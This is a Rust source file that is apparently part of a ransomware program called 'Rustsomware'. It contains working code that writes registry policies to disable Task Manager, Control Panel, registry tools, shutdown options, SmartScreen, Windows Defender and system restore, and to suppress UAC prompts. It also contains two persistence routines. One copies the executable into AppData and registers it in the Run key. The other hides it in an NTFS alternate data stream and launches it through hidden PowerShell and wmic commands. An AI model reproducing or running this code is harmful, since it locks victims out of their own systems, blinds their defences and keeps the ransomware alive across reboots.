use dirs;
use mslnk::ShellLink;
use rand::prelude::*;
use rand_hc::Hc128Rng;
use std::fs;
use std::path::Path;
use std::process::Command;
use walkdir::WalkDir;
use winreg;
use winreg::enums::*;
use winreg::RegKey;

pub fn lock_down_system() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    match hkcu.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("DisableChangePassword", &1u32);
            key.set_value("DisableLockWorkstation", &1u32);
            key.set_value("DisableTaskMgr", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
    match hkcu.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("HidePowerOptions", &1u32);
            key.set_value("NoControlPanel", &1u32);
            key.set_value("NoRun", &1u32);
        }
        Err(_) => (),
    };

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("HideFastUserSwitching", &1u32);
            // disables UAC so it's not required after reboot, making it so the user can't avoid the script that easily to run on startup at max power.
            key.set_value("PromptOnSecureDesktop", &0u32);
            key.set_value("EnableLUA", &1u32);
            key.set_value("ConsentPromptBehaviorAdmin", &0u32);
            key.set_value("ValidateAdminCodeSignatures", &0u32);
            key.set_value("FilterAdministratorToken", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("HidePowerOptions", &1u32);
            key.set_value("NoControlPanel", &1u32);
            key.set_value("NoRun", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Search\\AllowFindMyFiles");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowEditDeviceName");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowLanguage");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowPowerSleep");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowSignInOptions");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowYourAccount");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\EnableAppInstallControl",
    );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\EnableSmartScreenInShell",
    );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\PreventOverrideForFilesInShell",
    );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\DisableContextMenus");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideAppList");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideChangeAccountSettings");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideFrequentlyUsedApps");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideHibernate");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideLock");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HidePeopleBar");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HidePowerButton");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRecentJumplists");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRecentlyAddedApps");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRestart");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideShutDown");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSignOut");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSleep");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSwitchAccount");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideUserTile");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\NoPinningToTaskbar");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDeviceDelete");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDiagnosticDataViewer",
    );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDirectXDatabaseUpdate",
    );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableEnterpriseAuthProxy",
    );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableSystemRestore");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\TaskManager\\AllowEndTask");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableAccountProtectionUI",
        );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableDeviceSecurityUI",
        );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableNetworkUI",
        );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableVirusUI",
        );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisallowExploitProtectionOverride",
        );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &0u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\HideRansomwareDataRecovery",
        );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\HideSecureBoot",
        );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsLogon\\DontDisplayNetworkSelectionUI",
    );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsLogon\\HideFastUserSwitching",
    );
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("value", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
    match hklm.create_subkey(&path) {
        Ok((key, disp)) => {
            key.set_value("DisableAntiSpyware", &1u32);
        }
        Err(_) => (),
    };

    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value("DisableRegistryTools", &1u32);
}

pub fn start_ransomware_on_startup_classic() {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let (key, disp) = match hklm.create_subkey(&path) {
        Ok((key, disp)) => (key, disp),
        Err(_) => return,
    };
    let run = match hklm.open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run") {
        Ok(run) => run,
        Err(_) => return,
    };

    // Check if program is not already in startup, if is not goes on
    match run.get_value::<String, String>(String::from("Rustsomware")) {
        Ok(_) => return,
        Err(_) => (),
    };

    let exec_name = match get_exec_name() {
        Some(name) => name,
        None => return,
    };

    // Copy the program to a different path
    match get_home_dir() {
        Some(dir) => {
            let destination = dir.clone() + "\\AppData\\Roaming\\Cache\\";
            let target = dir.clone() + "\\AppData\\Roaming\\Cache\\" + &exec_name;
            let lnk = target.clone() + ".lnk";
            match fs::create_dir(&destination) {
                Ok(_) => (),
                Err(_) => {
                    fs::remove_dir_all(&destination);
                    fs::create_dir(&destination);
                    ()
                }
            }
            match fs::copy(&exec_name, &target) {
                Ok(_) => match ShellLink::new(&target) {
                    Ok(sl) => {
                        sl.create_lnk(&lnk);
                        key.set_value("Rustsomware", &("\"".to_owned() + &lnk + "\""));
                    }
                    Err(_) => (),
                },
                Err(_) => (),
            }
        }
        None => (),
    }
}

pub fn start_ransomware_on_startup_alternate_data_stream() {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let (key, disp) = match hklm.create_subkey(&path) {
        Ok((key, disp)) => (key, disp),
        Err(_) => {
            start_ransomware_on_startup_classic();
            return;
        }
    };
    let run = match hklm.open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run") {
        Ok(run) => run,
        Err(_) => {
            start_ransomware_on_startup_classic();
            return;
        }
    };

    // Check if program is not already in startup, if is not goes on
    match run.get_value::<String, String>(String::from("Rustsomware")) {
        Ok(_) => return,
        Err(_) => (),
    };

    let exec_name = match get_exec_name() {
        Some(name) => name,
        None => return,
    };

    // Copy the program to a different path
    match get_home_dir() {
        Some(dir) => {
            let ads_folder = dir.clone() + "\\AppData\\Roaming\\Cache";
            let ads_exe = dir.clone() + "\\AppData\\Roaming\\Cache:default_id";
            match fs::read_dir(&ads_folder) {
                Ok(_) => (),
                Err(_) => match fs::create_dir(&ads_folder) {
                    Ok(_) => (),
                    Err(_) => {
                        println!("Error creating dir cache!");
                        start_ransomware_on_startup_classic();
                        return;
                    }
                },
            }

            let destination = dir.clone() + "\\AppData\\Roaming\\rust\\";
            let target = dir.clone() + "\\AppData\\Roaming\\rust\\" + &exec_name;
            match fs::create_dir(&destination) {
                Ok(_) => (),
                Err(_) => {
                    fs::remove_dir_all(&destination);
                    fs::create_dir(&destination);
                    ()
                }
            }

            let mut startup_command =
                "cmd /c start /min cmd /c powershell -W Hidden -C \"(expand ".to_string();
            startup_command.push_str(&(String::from("'\"") + &ads_exe + "\"'"));
            startup_command.push_str(&" ");
            startup_command.push_str(&(String::from("'\"") + &dir + "\\" + &exec_name + "\"'"));
            startup_command.push_str(&") -and (wmic process call create '\"");
            startup_command.push_str(&(dir.clone() + "\\" + &exec_name + "\"'"));
            startup_command.push_str(&")\"");

            match fs::copy(&exec_name, &target) {
                Ok(_) => {
                    let command = format!(
                        "Start-Process \"cmd.exe\" '/c type \"{}\" > \"{}\"' -NoNewWindow",
                        &target, &ads_exe
                    );
                    match Command::new("cmd")
                        .args([
                            "/c",
                            "start",
                            "/min",
                            "cmd",
                            "/c",
                            "powershell",
                            "-WindowStyle",
                            "Hidden",
                            "-NonInteractive",
                            "-NoLogo",
                            "-Command",
                            &command,
                        ])
                        .spawn()
                    {
                        Ok(_) => {
                            key.set_value("Rustsomware", &startup_command);
                        }
                        Err(_) => {
                            start_ransomware_on_startup_classic();
                            return;
                        }
                    }
                }
                Err(_) => {
                    start_ransomware_on_startup_classic();
                    return;
                }
            }
        }
        None => (),
    }
}

fn get_home_dir() -> Option<String> {
    match dirs::home_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => Some(path_str.to_owned()),
            None => None,
        },
        None => None,
    }
}

pub fn get_exec_name() -> Option<String> {
    std::env::current_exe()
        .ok()
        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
        .and_then(|s| s.into_string().ok())
}
